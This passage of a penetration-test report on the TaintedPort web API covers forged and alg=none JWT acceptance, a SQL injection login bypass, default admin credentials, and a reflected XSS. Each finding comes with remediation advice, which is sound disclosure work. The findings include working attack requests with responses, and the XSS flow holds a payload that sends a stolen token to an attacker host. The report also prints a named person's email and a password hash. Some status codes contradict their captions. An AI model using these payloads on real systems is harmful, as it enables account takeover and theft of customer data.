**3. Forged HS256 token with random signature — accepted (admin escalation)**

*Request:*
```http
GET /admin/orders HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImF0dGFja2VyQGV4YW1wbGUuY29tIiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MSwiZXhwIjo5OTk5OTk5OTk5fQ.QkFEU0lH

```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"orders":[{"id":139,"user_id":373,"user_name":"Luis Grangeia","user_email":"luis.grangeia@snyk.io","total":-9999000,"status":"pending",...},{"id":138,...}, ... 139 orders total ...]}
```


> Token payload declares user_id=1 / is_admin=true, signature is the literal string BADSIG (base64url QkFEU0lH). Server returns the full admin order listing — signature is not verified.



**4. alg=none variant — likewise accepted**

*Request:*
```http
GET /admin/orders HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6InB3bjJAeCIsImlzX2FkbWluIjp0cnVlLCJpYXQiOjEsImV4cCI6OTk5OTk5OTk5OX0.

```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"orders":[ ... same admin listing ... ]}
```


> A JWT declaring alg=none with an empty signature segment is accepted — the classic 'none' attack works too.



**5. Impersonate victim user_id=425 and steal their password hash**

*Request:*
```http
GET /orders/136 HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <forged HS256, user_id=425, is_admin=false, signature=QkFEU0lH>

```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"order":{"id":136,"user_id":425,"total":1,"status":"shipped","owner_email":"bfla-throw-29938@example.com","owner_password_hash":"$2y$10$JoiU/0u23oVRmMtaEerD8.mP5sGbP9vDRqUVW9RyxAI8tPBt2LpDe","owner_totp_secret":null,"owner_is_admin":0,"items":[{"id":179,"wine_id":2,"wine_name":"Pêra-Manca Branco","price":1,"quantity":1}]}}
```


> Forging user_id=425 (a user we never authenticated as) is enough to read that user's order. The response embeds the victim's bcrypt password hash and TOTP seed — a full credential-and-2FA dump from a single unauthenticated request.





#### Remediation

1. **Enforce signature verification.** Use a maintained JWT library with an explicit algorithm allow-list. In PHP with `firebase/php-jwt >= 6.x`:
   ```php
   $decoded = JWT::decode($token, new Key($secret, 'HS256'));
   ```
   Never pass `['none']` in the allow-list, and never trust the client-supplied `alg` header (`decode($token, $key, [$header->alg])` is a known anti-pattern).

2. **Reject `alg: none`, empty `alg`, and unknown algorithms** before touching the payload.

3. **Do not trust `is_admin` from the token.** After verifying the signature, look up the user row by `user_id` and derive `is_admin` server-side. Remove `is_admin` from the JWT entirely.

4. **Use a strong secret** (32+ random bytes) stored in a secrets manager, not in application source or unprotected `.env` files. Rotate immediately as part of this remediation because forged tokens with far-future `exp` are already in the wild.

5. **Add server-side revocation.** Include a `ver` claim tied to a per-user counter and increment it on password change, email change, or explicit logout so that token invalidation is possible without a full secret rotation.

6. **Add regression tests** that assert forged/tampered tokens are rejected: modified payload with kept signature, `alg=none` (all case variants and absent-alg), and wrong-key HMAC.

7. **Post-remediation, invalidate every currently-issued JWT** by rotating the signing secret. Any attacker who exercised this bug may hold long-lived tokens with `exp` set decades in the future.

8. **Stop leaking `owner_password_hash` and `owner_totp_secret`** from `/orders/{id}`. No client of an order endpoint should ever receive the owner's password hash or 2FA seed — this is the amplifier that turns the JWT bug into a full credential dump.

---


### vuln-0012: Authentication Bypass via SQL Injection in POST /auth/login `email` Parameter (Unauthenticated Admin Takeover)










**Severity:** CRITICAL | **CVSS:** 10.0 | **Endpoint:** `/auth/login` | **Method:** POST | **CWE:** CWE-89 | **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

#### Description

The `POST /auth/login` endpoint of the TaintedPort API concatenates the JSON `email` value directly into the SQL query used for credential lookup. An unauthenticated attacker can inject a boolean tautology terminated by an SQL line comment (`--`) to (a) force the credential-lookup query to return an arbitrary user row and (b) neutralise the trailing password-hash check by making it part of the commented-out portion of the statement. Because the server treats a successful row retrieval as successful authentication and immediately mints an HS256-signed JWT for the returned user, this SQL injection is a direct authentication bypass. By tuning the predicate to `... OR email LIKE 'admin%'--` (or `... OR is_admin=1--`), the attacker selects the administrator row and obtains an admin JWT that is honoured by the server-side authorisation layer on every `/admin/*` route.


#### Attack Flow

```
┌──────────────────────────────────────────────────────────────────────┐
│                 Unauthenticated SQLi → Admin Takeover                │
│                    POST /auth/login  (email field)                   │
└──────────────────────────────────────────────────────────────────────┘

Prerequisites
─────────────
  • Network reachability to api.taintedport.com (public internet)
  • No credentials, no session, no CSRF token, no user interaction

┌──────────────┐        ┌─────────────────────────────────────────┐
│              │  (1)   │  POST /auth/login                       │
│  Attacker    │ ─────► │  {"email":"zzz' OR email LIKE 'admin%'--"│
│  (no auth)   │        │   ,"password":"anything"}               │
│              │        └────────────────────┬────────────────────┘
└──────────────┘                             │
                                             ▼
                        ┌───────────────────────────────────────────┐
                        │  PHP login handler (root cause)           │
                        │                                           │
                        │  $sql = "SELECT id,name,email,            │
                        │       password_hash,is_admin              │
                        │       FROM users WHERE email='" .         │
                        │       $email . "' AND password_hash='..'";│
                        │           ▲                               │
                        │           │  raw string concatenation     │
                        │           │  → SQLi                       │
                        └───────────┼───────────────────────────────┘
                                    │
                                    ▼
                        ┌───────────────────────────────────────────┐
                        │  SQLite 3.51.2 executes:                  │
                        │    SELECT ... FROM users                  │
                        │     WHERE email='zzz' OR email LIKE       │
                        │           'admin%'-- ' AND password_hash= │
                        │                                           │
                        │  '--' comments out the password check.    │
                        │  Row returned: administrator (user_id=3). │
                        └────────────────────┬──────────────────────┘
                                             │
                                             ▼
                        ┌───────────────────────────────────────────┐
                        │  Handler treats row as authenticated user │
                        │  and mints HS256 JWT:                     │
                        │    {"user_id":3,                          │
                        │     "email":"admin@example.com",          │
                        │     "is_admin":true,                      │
                        │     "iat":..., "exp":<+7 days>}           │
                        └────────────────────┬──────────────────────┘
                                             │
                                (2) HTTP 200 │ + admin JWT
                                             ▼
┌──────────────┐        ┌─────────────────────────────────────────┐
│  Attacker    │ ◄──────│  {"success":true,"token":"<admin JWT>", │
│  now holds   │        │   "user":{"id":3,"is_admin":true,...}}  │
│  admin JWT   │        └─────────────────────────────────────────┘
└──────┬───────┘
       │
       │ (3) GET /admin/orders   Authorization: Bearer <admin JWT>
       ▼
┌─────────────────────────────────────────────────────────────────┐
│  Server-side authorisation trusts the JWT's is_admin=true claim │
│  → HTTP 200 { "orders": [ ... 140+ orders with PII ... ] }      │
│                                                                 │
│  Every /admin/* route is now reachable: order management,       │
│  status changes, customer data access, etc.                     │
└─────────────────────────────────────────────────────────────────┘

Root Cause Summary
──────────────────
  Login handler interpolates the user-supplied `email` field into a raw SQL
  string; SQLite honours `--` as a line comment, so the injected payload
  eliminates the AND-clause that checks the password hash. The application
  has no defence-in-depth password_verify() gate in code — successful row
  retrieval alone is treated as successful authentication, so the SQLi is a
  direct, unauthenticated authentication bypass with full admin scope.
```


#### Impact

A completely unauthenticated network attacker takes over the administrator account with a single HTTP request. The returned JWT is a legitimate 7-day HS256 token carrying `is_admin:true` and is accepted by downstream server-side authorisation checks (verified against `GET /admin/orders`, which returns all customer orders and PII to admins only). The same primitive lets the attacker log in as any user by tweaking the predicate. Because exploitation requires no session, no CSRF token, no user interaction, and no prior knowledge of a valid account, the vulnerability is directly and remotely exploitable at internet scale. Combined with the separately-reported UNION-based SQLi in `/wines/{id}`, every bcrypt password hash and TOTP secret in the `users` table is also extractable, enabling offline password cracking and permanent multi-factor bypass.

#### Technical Analysis

The login handler builds the credential-lookup query by string-concatenating the JSON `email` value into a SQL statement whose effective shape is:

    SELECT id, name, email, password_hash, is_admin FROM users
     WHERE email = '<INPUT>' AND password_hash = '<hashed_or_literal_pw>'

Injecting `x' OR 'a'='a'--` produces:

    ... WHERE email = 'x' OR 'a'='a'--' AND password_hash = '...'

The `--` line comment discards the entire `AND password_hash = ...` clause. SQLite (fingerprinted as 3.51.2 via a companion UNION SQLi on the same host) evaluates the remaining predicate as always-true and returns every row; the application consumes the first row and treats it as an authenticated user, issuing a signed JWT with that user's `id`, `email`, and `is_admin` claims. Refining the predicate to `zzz' OR email LIKE 'admin%'--` (or `x' OR is_admin=1--`) restricts the result set to the administrator row, so the JWT is minted for the admin account. The decoded JWT payload confirms `{"user_id":3, "email":"admin@example.com", "is_admin":true}` and the token is accepted by `GET /admin/orders` (HTTP 200 with 140+ orders returned), proving that the server-side authorisation layer trusts the `is_admin` claim in the injected token.

Root cause: raw string interpolation of the `email` parameter into a SQL statement handled by SQLite (which accepts `--` as a valid line comment). The bug is in the server-side query construction, not in the JWT signing or the client. Crucially, there is no separate `password_verify()` gate in application code — the password check exists only inside the injectable SQL. Consequently, the SQLi is a direct authentication bypass rather than merely a data-disclosure primitive.

Backend fingerprint: SQLite 3.51.2, PHP 8.2.31 (`X-Powered-By: PHP/8.2.31`).


#### Proof of Concept


Reproduction (fully unauthenticated, no prior state):

1. Control — confirm the endpoint rejects invalid credentials:
   `POST /auth/login` body `{"email":"noexist-validator@example.com","password":"definitely-wrong-password"}`
   → HTTP 401, `{"success":false,"message":"Login failed …"}`.

2. Tautology bypass — authenticate as an arbitrary user without a password:
   `POST /auth/login` body `{"email":"anything' OR 'a'='a'-- ","password":"nomatter"}`
   → HTTP 200, `{"success":true,"token":"<JWT>","user":{"id":1,"name":"Luis Grangeia","email":"joe@example.com","is_admin":false}}`.

3. Admin targeting — restrict the injected predicate to admin rows:
   `POST /auth/login` body `{"email":"zzz' OR email LIKE 'admin%'-- ","password":"irrelevant"}`
   → HTTP 200, JWT claims decode to `{"user_id":3,"email":"admin@example.com","is_admin":true,…}`.

4. Authority verification — use the admin JWT against an admin-only route:
   `GET /admin/orders` with header `Authorization: Bearer <JWT from step 3>`
   → HTTP 200, `{"success":true,"orders":[…]}`. The server treats the injected JWT as fully privileged.

The reproduction is fully automated in `poc/poc.py` (executes all four steps and asserts each). A minimal regression test is provided in `poc/verify.py` — exits 0 if still vulnerable, 1 if fixed.



*The full exploit script is available in the annexes.*




#### Evidence


**1. Control — plausible email, wrong password → 401**

*Request:*
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"noexist-validator@example.com","password":"definitely-wrong-password"}
```

*Response:*
```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json

{"success":false,"message":"Login failed for noexist-validator@example.com. Please check your credentials."}
```


> Baseline confirms that valid-shaped but incorrect credentials are rejected. Only injected SQL in the email field triggers the bypass.



**2. Tautology auth bypass — SQLi in email → 200 + JWT for first user row**

*Request:*
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"anything' OR 'a'='a'-- ","password":"nomatter"}
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImpvZUBleGFtcGxlLmNvbSIsImlzX2FkbWluIjpmYWxzZSwiaWF0IjoxNzg0NTQ4MjE1LCJleHAiOjE3ODUxNTMwMTV9.<sig>","user":{"id":1,"name":"Luis Grangeia","email":"joe@example.com","is_admin":false}}
```


> SQL comment '--' swallows the trailing password-hash check. The server issues a valid HS256 JWT (7-day lifetime) for the first row of the users table, proving that the password check is exclusively enforced inside the injectable SQL — there is no defence-in-depth password_verify() in code.



**3. Admin targeting — LIKE-restricted predicate → 200 + admin JWT (is_admin=true)**

*Request:*
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"zzz' OR email LIKE 'admin%'-- ","password":"irrelevant"}
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjozLCJlbWFpbCI6ImFkbWluQGV4YW1wbGUuY29tIiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MTc4NDU0ODIxNSwiZXhwIjoxNzg1MTUzMDE1fQ.<sig>","user":{"id":3,"name":"Admin User","email":"admin@example.com","is_admin":true}}
```


> The predicate restricts the returned row to admin users. Decoded JWT payload: {"user_id":3,"email":"admin@example.com","is_admin":true,"iat":...,"exp":...}. No credentials of any kind were supplied.



**4. Admin JWT authorises admin-only endpoint → 200 with all orders**

*Request:*
```http
GET /admin/orders HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <JWT from step 3>
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"orders":[{"id":142,"user_id":373,"user_name":"Luis Grangeia","user_email":"luis.grangeia@snyk.io","total":-1500000,"status":"pending","shipping_name":"Validator PoC","shipping_city":"Lisboa","order_date":"2026-07-20 11:46:46","items_count":1}, ... 140+ orders total ...]}
```


> The server-side authorisation layer accepts the injected JWT as fully privileged administrator: /admin/orders (403 for non-admins) returns HTTP 200 with the full order listing, including customer PII and shipping addresses. This proves the SQLi is not merely a data-exposure primitive but a complete authentication bypass with cross-component authority (Scope: Changed).





#### Remediation

1. Replace the string-concatenated SQL in the login handler with a prepared statement using bound parameters, e.g.:

       $stmt = $pdo->prepare('SELECT id, name, email, password_hash, is_admin FROM users WHERE email = :email');
       $stmt->execute([':email' => $email]);
       $row  = $stmt->fetch();

   and perform the password check in PHP via `password_verify($password, $row['password_hash'])`, so that no user-controlled data ever reaches the SQL parser and successful authentication requires an explicit hash comparison in application code.

2. Audit every other endpoint that concatenates user input into SQL — see sibling findings for `GET /wines/{id}` (UNION SQLi) and `GET /wines?search` (blind boolean SQLi). The same code style is likely repeated.

3. Introduce a repository/DAO layer that only exposes parameterised methods; ban ad-hoc string SQL in code review and enforce via a linter.

4. Rotate the HS256 signing secret so that any JWTs minted while the endpoint was exploitable are immediately invalidated. Consider migrating to short-lived tokens plus refresh tokens.

5. Force a password reset and TOTP re-enrollment for every account, since password hashes and TOTP secrets are also extractable via the sibling `/wines/{id}` UNION SQLi finding.

6. Add a WAF/CDN rule flagging obvious SQL metacharacters in authentication payloads as a compensating control, but not as a replacement for parameterisation.

7. Add integration tests that assert `POST /auth/login` with `{"email":"x' OR 1=1--","password":"x"}` and `{"email":"zzz' OR email LIKE 'admin%'--","password":"x"}` return HTTP 401 and do not issue a token.

---


### vuln-0009: Default Administrative Credentials (admin@example.com : password123) on POST /auth/login Grant Full Admin Takeover










**Severity:** CRITICAL | **CVSS:** 9.4 | **Endpoint:** `/auth/login` | **Method:** POST | **CWE:** CWE-1392 | **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L`

#### Description

The TaintedPort application ships with a seeded administrative account whose credentials are the well-known default pair `admin@example.com` : `password123`. The `POST /auth/login` endpoint accepts these credentials and returns a signed HS256 JWT whose payload contains `is_admin: true` for user id 3 ("Admin User"). All privileged `/admin/*` endpoints trust the `is_admin` claim, so the token yields immediate, complete administrative control of the application. No prior authentication, user interaction, or network positioning is required — the credential pair is one of the first entries in any default-credential wordlist, so a fully unauthenticated Internet attacker who can reach the login endpoint can take over the application with a single HTTP request.

During validation, submitting the pair returned HTTP 200 with a JWT that decoded to `{"user_id":3,"email":"admin@example.com","is_admin":true,"iat":...,"exp":...}`. `GET /auth/me` confirmed the identity as "Admin User" (created_at 2026-07-20 00:00:04 — matching the earliest seed timestamps in the database, and `totp_enabled: false`). Exercising the token against `GET /admin/orders` returned HTTP 200 with 140 orders belonging to other customers, exposing names, emails, order totals, statuses and shipping details. The same admin endpoint returns HTTP 403 `{"success":false,"message":"Admin access required."}` for a normal-user JWT, proving the admin claim is enforced server-side and that the default-credential token truly carries administrative authority — not merely a client-side flag.

No rate limiting, account lockout, MFA challenge, first-login password change, or CAPTCHA is enforced on `/auth/login`, and no server-side JWT revocation exists (tokens are stateless with a 7-day lifetime).


#### Attack Flow

```
┌─────────────────────────────────────────────────────────────────────┐
│  DEFAULT-CREDENTIAL ADMIN TAKEOVER — TaintedPort /auth/login        │
└─────────────────────────────────────────────────────────────────────┘

  Prerequisites:
    • Network reach to https://api.taintedport.com/auth/login
    • Standard browser User-Agent header (bypasses Cloudflare edge check)
    • NO valid account, NO token, NO user interaction required

 ┌──────────┐                                          ┌──────────────┐
 │ Attacker │                                          │ TaintedPort  │
 │  (any    │                                          │   API + DB   │
 │  origin) │                                          │              │
 └────┬─────┘                                          └──────┬───────┘
      │                                                       │
      │ [1] POST /auth/login                                  │
      │     {"email":"admin@example.com",                     │
      │      "password":"password123"}                        │
      │──────────────────────────────────────────────────────▶│
      │                                                       │  bcrypt.check
      │                                                       │  users WHERE email=?
      │                                                       │  → MATCH  (seeded row
      │                                                       │            id=3, is_admin=true)
      │                                                       │
      │  200 OK  {token: <JWT HS256>,                         │
      │            user:{id:3, is_admin:true}}                │
      │◀──────────────────────────────────────────────────────│
      │                                                       │
      │ decode JWT.payload →                                  │
      │  {"user_id":3,"email":"admin@example.com",            │
      │   "is_admin":true,"iat":...,"exp":iat+604800}         │
      │                                                       │
      │ [2] GET /auth/me   Authorization: Bearer <JWT>        │
      │──────────────────────────────────────────────────────▶│
      │  200 OK  {name:"Admin User", is_admin:true,           │
      │           totp_enabled:false}                         │
      │◀──────────────────────────────────────────────────────│
      │                                                       │
      │ [3] GET /admin/orders   Authorization: Bearer <JWT>   │
      │──────────────────────────────────────────────────────▶│
      │                                                       │  is_admin == true?  YES
      │  200 OK  {orders:[ … 140 records … ]}                 │
      │    • user_name, user_email                            │
      │    • total, status, shipping_name, shipping_city      │
      │◀──────────────────────────────────────────────────────│
      │                                                       │
      │  ============================================         │
      │  >>> FULL ADMIN TAKEOVER + WHOLESALE PII LEAK <<<     │
      │  ============================================         │
      │                                                       │
      │ [4] Optional chain — enumerate /orders/{id}           │
      │     to harvest every user's                           │
      │     owner_password_hash + owner_totp_secret           │
      │     → offline crack + 2FA bypass → ATO of all users   │
      │                                                       │

  Root cause:
    ─────────────────────────────────────────────────────────────────
    A production database retains a seeded administrator account
    (id=3, admin@example.com) whose password is the well-known
    default "password123". No first-login rotation, no MFA on
    admin, no rate-limit or lockout on /auth/login, and JWTs are
    stateless with a 7-day lifetime so previously-issued admin
    tokens cannot be revoked without rotating the HS256 secret.
    ─────────────────────────────────────────────────────────────────
```


#### Impact

Unauthenticated, one-request full administrative takeover of the entire application:

- Wholesale disclosure of customer PII: `GET /admin/orders` (verified) returns every order in the system (140 observed) with `user_name`, `user_email`, `total`, `status`, and shipping data (name, city, order date). Individual `GET /admin/orders/{id}` calls expose full shipping addresses and phone numbers.
- Fraud and integrity impact: `PUT /admin/orders/{id}/status` allows the attacker to change any order's status — e.g. mark unpaid cash-on-delivery orders as shipped, or cancel legitimate orders.
- Cross-user account takeover via chaining: the pre-existing `GET /orders/{id}` information-disclosure behavior returns `owner_email`, `owner_password_hash` (bcrypt), `owner_totp_secret`, and `owner_is_admin`. Because the admin token enumerates every order id, the entire user base's bcrypt hashes and TOTP seeds can be harvested for offline cracking and 2FA bypass.
- Any capability enforced by the `is_admin` JWT claim — present or future — is trivially reachable.
- Because JWTs are stateless with a 7-day lifetime and no revocation endpoint exists, an attacker who has previously used this default retains admin access for up to seven days after any password change, until the HS256 signing secret is rotated.

Business impact: total loss of confidentiality and integrity of order and customer data, direct fraud exposure on order fulfilment, breach-notification obligations under GDPR / equivalent regulation, and reputational damage.

#### Technical Analysis

Root cause: a production deployment retains a factory/demo administrative account with textbook default credentials (`admin@example.com` / `password123`). This is a CWE-1392 (Use of Default Credentials), a specialization of CWE-798 (Use of Hard-coded Credentials).

Authentication flow observed:

1. `POST /auth/login` validates the submitted email/password against a stored bcrypt hash.
2. On success it returns a JWT signed with HS256 whose payload has the shape `{"user_id":<int>,"email":"…","is_admin":<bool>,"iat":<epoch>,"exp":<epoch>}`. Token lifetime is 7 days (`exp - iat = 604800`).
3. Every `/admin/*` endpoint reads the `is_admin` claim from the decoded token and returns HTTP 403 `Admin access required.` when it is false. Enforcement is server-side, so a genuine admin claim (as issued for user id 3) grants real admin authority.

Contributing weaknesses that turn the default credential into an unmitigated critical:

- No first-login password rotation is enforced for `is_admin` accounts.
- MFA is not required on privileged accounts (the seeded admin has `totp_enabled: false`).
- No rate limiting, account lockout, or CAPTCHA on `/auth/login` — hundreds of login attempts in rapid succession are accepted with only a Cloudflare edge check on User-Agent (bypassed by supplying any normal browser UA).
- No server-side JWT revocation (stateless tokens) and no rotation of the HS256 signing secret at deploy time — once an attacker obtains a token, revoking access requires rotating the secret, invalidating every user's session.
- Breached-password detection is absent — `password123` is one of the most common passwords in every leaked-credential list.

Discovery: submitting the credential pair returns HTTP 200 with a token whose decoded payload is `{"user_id":3,"email":"admin@example.com","is_admin":true,"iat":1784547882,"exp":1785152682}`. `GET /auth/me` with the token returns `"name":"Admin User","is_admin":true,"totp_enabled":false,"created_at":"2026-07-20 00:00:04"` — a timestamp consistent with the earliest DB seed rows, indicating the account was created as part of the initial fixture and never rotated.


#### Proof of Concept


Fully unauthenticated attacker; reproducible in four HTTP requests.

1. Send `POST https://api.taintedport.com/auth/login` with header `Content-Type: application/json` and body `{"email":"admin@example.com","password":"password123"}`. Any standard browser `User-Agent` bypasses Cloudflare's minimal edge check.
2. Server returns HTTP 200 with `{"success":true,"token":"<JWT>","user":{"id":3,"name":"Admin User","email":"admin@example.com","is_admin":true}}`. Base64url-decode the second segment of the JWT and observe `is_admin:true`.
3. Confirm identity: `GET /auth/me` with `Authorization: Bearer <JWT>` → HTTP 200, `"name":"Admin User","is_admin":true,"totp_enabled":false,"created_at":"2026-07-20 00:00:04"`.
4. Confirm server-side admin authority: `GET /admin/orders` with the same bearer token → HTTP 200 returning the full list of orders (140 observed during validation) with customer PII (names, emails, order totals, shipping data). The identical request with a non-admin user's JWT returns HTTP 403 `{"success":false,"message":"Admin access required."}`, proving the admin claim is genuinely privileged.

Negative control (also verified): the same email with any other password (`WrongPass!`) returns `{"success":false,"message":"Login failed for admin@example.com. Please check your credentials."}` — proving the endpoint correctly distinguishes valid vs invalid credentials and that `password123` is the specific working default.

`poc/poc.py` performs all four steps end-to-end with rich console output; `poc/verify.py` is a minimal regression check that exits 0 while vulnerable.



*The full exploit script is available in the annexes.*




#### Evidence


**1. Login with default credentials admin@example.com:password123**

*Request:*
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0

{"email":"admin@example.com","password":"password123"}
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjozLCJlbWFpbCI6ImFkbWluQGV4YW1wbGUuY29tIiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MTc4NDU0Nzg4MiwiZXhwIjoxNzg1MTUyNjgyfQ.51gNwK0tqlvxs7YReCTfbOUPDtTJNqn298CAWcjwH5Q","user":{"id":3,"name":"Admin User","email":"admin@example.com","is_admin":true}}
```


> The well-known default credential pair is accepted. The server returns a signed HS256 JWT whose base64url-decoded payload is {"user_id":3,"email":"admin@example.com","is_admin":true,"iat":...,"exp":...} — an unauthenticated attacker just obtained an admin JWT.



**2. /auth/me confirms server-side identity is Admin User**

*Request:*
```http
GET /auth/me HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer eyJhbGciOi...admin JWT...
User-Agent: Mozilla/5.0
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"user":{"id":3,"name":"Admin User","email":"admin@example.com","is_admin":true,"totp_enabled":false,"created_at":"2026-07-20 00:00:04"}}
```


> Server confirms the token maps to the seeded Admin User (id=3, created_at matches the DB seed timestamp) and that TOTP is not enabled.



**3. Admin authority proven — /admin/orders returns all customer orders**

*Request:*
```http
GET /admin/orders HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer eyJhbGciOi...admin JWT...
User-Agent: Mozilla/5.0
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"orders":[{"id":140,"user_id":373,"user_name":"Luis Grangeia","user_email":"luis.grangeia@snyk.io","total":-2499999,"status":"pending","shipping_name":"Validator","shipping_city":"Lx","order_date":"2026-07-20 11:44:12","items_count":1}, ... 140 total orders ...]}
```


> The admin token grants read access to every order in the system (140 records observed), including customer names, emails, and shipping data — a wholesale PII breach.



**4. Negative control — same endpoint with a normal user's JWT is denied**

*Request:*
```http
GET /admin/orders HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <non-admin JWT for luis.grangeia@snyk.io>
User-Agent: Mozilla/5.0
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":false,"message":"Admin access required."}
```


> Confirms /admin/orders enforces is_admin server-side. The default-credential JWT bypasses this control because the seeded account is genuinely privileged in the database.



**5. Negative control — wrong password for the same account is rejected**

*Request:*
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json
User-Agent: Mozilla/5.0

{"email":"admin@example.com","password":"WrongPass!"}
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":false,"message":"Login failed for admin@example.com. Please check your credentials."}
```


> Endpoint properly distinguishes valid vs invalid credentials — proves admin@example.com:password123 is the specific working default. No rate-limiting or lockout observed across many attempts.





#### Remediation

Immediate (containment):
1. Rotate the password of the `admin@example.com` account to a strong, unique value — or delete the account entirely if it is not required in production. Rotate any other seeded/demo accounts in the database.
2. Rotate the HS256 JWT signing secret. This invalidates every token previously issued for the compromised admin account (which otherwise remain valid for up to 7 days, since JWTs are stateless and there is no revocation endpoint). All users will need to re-authenticate.
3. Audit application access logs for prior successful logins on `admin@example.com` from unexpected source IPs. If any exist, treat the environment as compromised: review database changes and order-status modifications made under the admin session, and consider a breach-notification review.

Structural (prevention):
4. Never ship a production build with a fixed seeded administrative credential. If a bootstrap admin is required, generate a random password at provisioning time, print/store it once, and require a password change on first login.
5. Enforce a first-login password-change flow for any account with `is_admin=true`.
6. Require MFA (TOTP or equivalent) for all administrative accounts. The seeded admin's `totp_enabled` was `false`.
7. Add rate-limiting and account-lockout on `POST /auth/login`. Suggested policy: exponential backoff, 5 failed logins per IP per minute, 10 failed logins per account per hour, with lockout and alerting on threshold breach. A Cloudflare Rate-Limiting rule can be added quickly as a compensating control.
8. Add breached-password detection at registration and password-change time (e.g., HaveIBeenPwned API or a local Pwned Passwords k-anonymity check) so that `password123` and similarly compromised passwords can no longer be set.
9. Add logging and real-time alerting on authentication events for administrative accounts (successful login, permission escalation, unexpected IP/geolocation).
10. Move to shorter-lived access tokens with server-side refresh/revocation, or add a token revocation list keyed on `jti` claims, so that a compromised admin token can be invalidated without rotating the global signing secret.

---


### vuln-0008: Reflected XSS in POST /api/contact/preview enables cross-site JWT theft and account takeover










**Severity:** CRITICAL | **CVSS:** 9.3 | **Endpoint:** `/api/contact/preview` | **Method:** POST | **CWE:** CWE-79 | **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`

#### Description

The unauthenticated endpoint `POST /api/contact/preview` on `https://taintedport.com` (also reachable at `https://api.taintedport.com/api/contact/preview`) reflects the submitted `name`, `email`, `subject`, and `message` form fields verbatim into a `Content-Type: text/html; charset=UTF-8` response, without any HTML entity encoding. The endpoint is unauthenticated, requires no CSRF token, and accepts `application/x-www-form-urlencoded` — a CORS-simple request that does not trigger a preflight.

The Next.js single-page application served on the same `taintedport.com` origin stores each user's authentication JWT in `localStorage.token`. Because the reflection sink and the JWT storage share the same origin, an attacker who lures a logged-in TaintedPort user to any attacker-controlled page can auto-submit a cross-origin HTML form whose `message` field contains a `<script>` payload. When the victim visits the attacker page, the browser POSTs to the reflection endpoint, follows the `text/html` response, and executes the injected JavaScript on `taintedport.com`. That script reads `localStorage.token` and exfiltrates the JWT, granting the attacker full control of the victim's account for the token's remaining lifetime.

The response carries no defensive controls: no `Content-Security-Policy`, no `X-Content-Type-Options`, no `X-Frame-Options`, no `Referrer-Policy`, and no `Strict-Transport-Security`. Nothing in the response mitigates the injection.


#### Attack Flow

```
┌─────────────────────────────────────────────────────────────────────────┐
│ PREREQUISITES                                                           │
│  • Victim is logged in to TaintedPort (JWT in localStorage.token        │
│    on origin https://taintedport.com — normal SPA state).               │
│  • Endpoint POST /api/contact/preview reflects name/email/subject/      │
│    message verbatim into text/html with NO CSP, NO CSRF token, NO auth. │
│  • Content-Type accepted: application/x-www-form-urlencoded (CORS-      │
│    simple request → no preflight for cross-site form submission).       │
└─────────────────────────────────────────────────────────────────────────┘

    ┌──────────────┐              ┌──────────────────────────┐
    │   Attacker   │              │  Victim's browser        │
    │  (any origin │              │  origin=taintedport.com  │
    │   on the web)│              │  localStorage.token=JWT  │
    └──────┬───────┘              └────────────┬─────────────┘
           │                                   │
   [1] Attacker hosts a page containing:       │
       <form action="https://taintedport.com   │
             /api/contact/preview" method=POST>│
         <input name=message value=            │
           '<script>fetch(                     │
             "https://attacker/?t="+           │
             localStorage.token)</script>'>    │
       </form>                                 │
       <script>form.submit()</script>          │
           │                                   │
           │  [2] Victim visits attacker page  │
           │ ──────────────────────────────►   │
           │                                   │
           │  [3] Browser auto-POSTs the form  │
           │      (x-www-form-urlencoded →     │
           │       no preflight, no CSRF check)│
           │                                   ▼
           │             ┌──────────────────────────────────────┐
           │             │  https://taintedport.com             │
           │             │  POST /api/contact/preview           │
           │             │  (PHP/8.2.31)                        │
